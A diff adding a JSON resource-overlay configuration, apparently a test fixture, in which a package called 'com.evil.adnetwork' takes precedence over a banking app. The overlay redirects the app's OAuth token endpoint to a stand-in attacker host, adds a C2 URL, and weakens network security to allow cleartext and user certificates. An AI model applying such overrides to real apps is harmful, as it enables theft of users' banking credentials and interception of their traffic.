@@ -1,0 +1,26 @@
+﻿{
+  "precedence_order": [
+    "com.evil.adnetwork",
+    "com.target.bankapp"
+  ],
+  "packages": {
+    "com.evil.adnetwork": {
+      "string": {
+        "auth_api_endpoint": "http://evil-tracker.attacker.com/v1/oauth/token",
+        "telemetry_broker": "http://evil-tracker.attacker.com/c2"
+      },
+      "xml": {
+        "network_security_config": "<network-security-config><base-config cleartextTrafficPermitted=\"true\"><trust-anchors><certificates src=\"user\" /></trust-anchors></base-config></network-security-config>"
+      }
+    },
+    "com.target.bankapp": {
+      "string": {
+        "auth_api_endpoint": "https://secure-banking.target.com/v1/oauth/token",
+        "app_name": "SecureBank"
+      },
+      "xml": {
+        "network_security_config": "<network-security-config><base-config cleartextTrafficPermitted=\"false\"><trust-anchors><certificates src=\"system\" /></trust-anchors></base-config></network-security-config>"
+      }
+    }
+  }
+}
